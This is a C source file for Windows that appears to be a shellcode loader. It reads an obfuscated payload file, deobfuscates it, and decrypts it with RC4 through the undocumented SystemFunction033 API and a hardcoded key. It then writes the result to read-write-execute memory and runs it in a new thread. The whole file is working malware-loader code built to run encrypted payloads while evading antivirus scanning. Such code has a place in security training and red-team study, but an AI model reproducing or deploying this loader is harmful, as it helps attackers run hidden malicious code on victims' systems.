#include <Windows.h>
#include <stdio.h>
#include "common.h"

//#define PREFIX ".testing"

// Function to report WinApi Errors
BOOL ReportError(const char* WinApiName) {
    printf("[!] \"%s\" [ FAILED ] \t%d \n", WinApiName, GetLastError());
    return FALSE;
}

// Function to Decrypt the RC4 encrypted Payload
BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS STATUS = 0;

    // Defining the key as a USTRING structure
    USTRING Key = {
        .Buffer = pRc4Key,
        .Length = (USHORT)dwRc4KeySize,
        .MaximumLength = (USHORT)dwRc4KeySize
    };

    // Defining the Encrypted Data as a USTRING Structure
    USTRING Data = {
        .Buffer = pPayloadData,
        .Length = (USHORT)sPayloadSize,
        .MaximumLength = (USHORT)sPayloadSize
    };

    // Exporting SystemFunction033 from the Advapi32.dll
    HMODULE hAdvapi32 = LoadLibraryA("Advapi32");
    if (!hAdvapi32) {
        return ReportError("LoadLibraryA");
    }
    fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(hAdvapi32, "SystemFunction033");
    if (!SystemFunction033) {
        return ReportError("GetProcAddress");
    }

    // Calling the SystemFunction033
    if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
        printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return TRUE;
}

//// Function to Write the Payload File
//BOOL WritePayloadFile(IN PSTR cFileInput, IN LPCVOID pPayloadData, IN SIZE_T Size)
//{
//    // Local Variable definitions
//    HANDLE	hFile = INVALID_HANDLE_VALUE;
//    DWORD	dwNumberOfBytesWritten = NULL;
//
//    // constructing the output file name
//    CHAR* cFileName = (CHAR*)malloc(strlen(cFileInput) + sizeof(PREFIX) + 1);
//    wsprintfA(cFileName, "%s%s", cFileInput, PREFIX);
//
//    // Open the file
//    hFile = CreateFileA(cFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, NULL, NULL);
//    if (hFile == INVALID_HANDLE_VALUE)
//        return ReportError("CreateFileA");
//
//    // Write the file
//    if (!WriteFile(hFile, (LPCVOID)pPayloadData, Size, &dwNumberOfBytesWritten, NULL) || (DWORD)Size != dwNumberOfBytesWritten) {
//        printf("[i] Wrote %ld from %ld Bytes \n", dwNumberOfBytesWritten, Size);
//        return ReportError("WriteFile");
//    }
//
//    // cleanup
//    free(cFileName);
//    CloseHandle(hFile);
//
//    return TRUE;
//}

int main(int argc, char* argv[]) {

    if (!(argc >= 2)) {
        printf("[!] Please Specify Input '.cl' File To Run ... \n");
        return -1;
    }

    // Print the file path being used
    printf("[i] File Path: %s\n", argv[1]);

    // Defining the Key
    BYTE _key[KEY_SIZE] = { 0xA7, 0x4E, 0x70, 0x79, 0x01, 0xB0, 0x3D, 0x74, 0x27, 0x3A, 0xED, 0xBD, 0x85, 0xB8, 0xE9, 0xA5 };

    printf("[i] BUFF_SIZE : [ 0x%0.4X ] - NULL_BYTES : [ 0x%0.4X ]\n", BUFF_SIZE, NULL_BYTES);

    HANDLE hFile = INVALID_HANDLE_VALUE, hThread = NULL;
    DWORD dwFileSize = 0, dwNumberOfBytesRead = 0;

    PBYTE pBuffer = NULL;

    // Reading the Encrypted Payload
    hFile = CreateFileA((LPCSTR)argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return ReportError("CreateFileA");

    // Reading the File Size
    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
        return ReportError("GetFileSize");

    // Allocating Memory for the Encrypted Payload
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuffer)
        return ReportError("HeapAlloc");

    // Reading the Encrypted Payload
    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwFileSize) {
        printf("[i] Read %ld from %ld Bytes \n", dwNumberOfBytesRead, dwFileSize);
        return ReportError("ReadFile");
    }

    CloseHandle(hFile);

    printf("[i] size of pbuffer : %ld \n", dwFileSize);

    // Create a buffer of the value of the size KEY_SIZE
    PBYTE KeySizeBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, KEY_SIZE);
    if (KeySizeBuffer == NULL) {
        printf("[!] Failed to allocate memory for KeySizeBuffer.\n");
        return -1;
    }

    // Store the first 0x10 bytes of pBuffer into KeySizeBuffer
    memcpy(KeySizeBuffer, pBuffer, KEY_SIZE);

    // Move the pointer of pBuffer to after 0x10 bytes of the initial position
    pBuffer += KEY_SIZE;
    dwFileSize -= KEY_SIZE;

    printf("[i] Deobfuscated Payload Size : %ld \n", dwFileSize);

    // Deobfuscate the Payload
    SIZE_T DeobfuscatedPayloadSize = 0;
    PBYTE DeobfuscatedPayloadBuffer = NULL;

    printf("[i] Deobfuscating \"%s\" ... ", argv[1]);
    if (!Deobfuscate(pBuffer, dwFileSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize, KeySizeBuffer)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("\t>>> Deobfuscated Payload Size : %llu \n\t>>> Deobfuscated Payload Located At : 0x%p \n", (unsigned long long)DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);

    if (!Rc4EncryptionViSystemFunc033(_key, DeobfuscatedPayloadBuffer, sizeof(_key), DeobfuscatedPayloadSize)) {
        return -1;
    }

    printf("[+] Payload Decrypted at : %p\n", DeobfuscatedPayloadBuffer);
    printf("[$] Press <Enter> To Run ... ");
    getchar();

    // Allocate Memory for the Decrypted Payload
    PVOID pExecAddress = VirtualAlloc(NULL, DeobfuscatedPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pExecAddress)
        return ReportError("VirtualAlloc");

    // Copy the Decrypted Payload to the Executable Memory
    memcpy(pExecAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);

    printf("[i] Running Payload Thread ... ");

    // Create a Thread to Run the Decrypted Payload
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecAddress, NULL, 0, NULL);
    if (!hThread) {
        ReportError("CreateThread");
        return -1;
    }

    // Wait for the Thread to Finish
    DWORD dwWaitResult = WaitForSingleObject(hThread, INFINITE);
    if (dwWaitResult == WAIT_FAILED) {
        ReportError("WaitForSingleObject");
        return -1;
    }

    // Check the exit code of the thread
    DWORD dwExitCode = 0;
    if (!GetExitCodeThread(hThread, &dwExitCode)) {
        ReportError("GetExitCodeThread");
        return -1;
    }
    printf("[i] Payload Thread Exit Code: %lu\n", dwExitCode);

    printf("[+] DONE \n");

    return 0;
}
